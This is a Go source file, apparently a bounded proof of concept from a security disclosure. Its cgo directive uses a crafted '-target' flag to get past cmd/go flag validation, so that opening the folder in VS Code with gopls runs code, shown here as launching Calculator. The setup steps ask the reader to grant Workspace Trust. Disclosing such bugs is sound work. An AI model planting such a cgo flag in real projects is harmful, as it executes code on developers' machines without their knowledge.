// Package calculator_demo is a bounded visual reproduction for a cmd/go cgo
// flag-validation bypass on Apple-silicon macOS.
//
// Requirements: Go, Apple Command Line Tools, VS Code with the Go extension,
// and the GitHub CLI.
//
//	DEMO_ROOT="$(mktemp -d /tmp/go-cgo-calculator.XXXXXX)"
//	gh repo clone benr00t3d/go-cgo-target-macos-poc "$DEMO_ROOT/repo"
//	code --new-window "$DEMO_ROOT/repo"
//
// Grant Workspace Trust when prompted, then leave the folder untouched. VS
// Code opens this file, the Go extension starts gopls, and Calculator opens.
// No build, run, task, or terminal command is required after opening the
// folder. The loaded library makes no network connection and starts no shell.
//
// Technical details, controls, provenance, and remediation guidance are in
// disclosure/REPORT.md.
package calculator_demo

/*
#cgo darwin,arm64 CFLAGS: -target arm64-cfg/poc-darwin
*/
import "C"
